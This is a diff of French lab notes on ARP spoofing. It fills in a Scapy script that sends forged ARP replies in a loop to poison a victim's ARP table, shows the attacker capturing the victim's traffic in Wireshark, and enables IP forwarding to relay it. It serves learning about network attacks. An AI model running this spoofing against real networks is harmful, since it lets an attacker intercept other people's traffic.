@@ -608,40 +608,47 @@ Paquet ARP :
 - Protocol Type : 0x8000 (ipv4)
 - Hardware adress lenght : 6 octets, protocol adresse lenght : 4 octets
 - operation code : 2 (si c'est une requete ou une reponse)
-- sender mac adress : 
+- sender mac adress : (adresse MAC de l'attaquant)
+- sender ip adress : (adresse IP du routeur)
+- recipient MAC adress : (adresse mac de la victime)
+- recipient IP adress : (adress ip de la victime) 
 
 ````
 from scapy.all import *
 
 trame = Ether(type=0x0806) # créer une trame ethernet, valeur type permet de dire quel protocole on utilise, le ARP = 0x0806
-packet = ARP # retourne un paquet arp vide, dans elquel on va remplire les infos
+packet = ARP() # retourne un paquet arp vide, dans elquel on va remplire les infos
 
 packet.hwlen = 6
 packet.plen = 4
 packet.op = 2
-packet.psrc = 'xxx ip'
-packet.pdst = 'xxx ip'
-packet.hwsrc = 'xxx mac'
-packet.hwdst = 'xxx mac'
+packet.psrc = 'xxx ip' #addr ip du routeur
+packet.pdst = 'xxx ip' #addr ip victime
+packet.hwsrc = 'xxx mac' #addr mac #addr mac de l'attaquant
+packet.hwdst = 'xxx mac' #addr mac #addr mac de la victime
 
 total = trame / packet
 while True: #envoyer le packet
        sendp(total) 
 ````
 
-Résultat : on reçoit bien tous les paquets qui sont déstinés au routeur, la machine cible croit qu'on est le routeur
+Résultat : ca a marché, on a bien changé la table ARP, désormais l'adresse mac de la machine attaquante est associée à l'adresse IP du routeur. 
+
+```
+ping 192.168.1.254 // à partir de la machine victime ==>  ca s'affiche bien sur le wirshark de notre Kali sur le MSI
+// Wireshark ==> on reçoit bien tous les paquets qui sont déstinés au routeur, la machine cible croit qu'on est le routeur
+```
 
 ### b. Router les paquets reçus de la machine cible vers le routeur et inversement
 
 Par défaut, si une machine linux reçoit des paquets qui ne lui sont pas destinés (avec une IP différente), elle jete les paquets = IP forwarding est désactivé par défaut.
 ```
-echo 1 > /proc/sys/net/ipv4/ip_forward #activer le forwarding des paquets
+sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
 ```
 
 ### c. Faire le même choses pour les paquets qui vont du routeur à la cible
 
 - Réussir à mettre notre adresse MAC à la place de l'adresse MAC de la victime dans la table ARP du routeur
-- Router les paquets vers la victime
 
 
 ## 2. Monitoring & modify the traffic
